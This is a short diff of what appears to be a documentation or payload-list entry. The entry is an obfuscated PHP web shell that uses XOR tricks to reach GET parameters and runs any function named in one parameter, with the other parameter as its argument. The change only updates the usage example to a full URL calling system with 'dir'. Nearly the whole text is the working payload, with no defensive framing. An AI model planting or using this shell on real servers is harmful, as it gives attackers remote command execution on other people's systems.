@@ -3,4 +3,4 @@
 ```
 <?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?> <?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
 ```
-Example: `_=system&__=dir`
+Example: `http://localhost/webshell.php?_=system&__=dir`
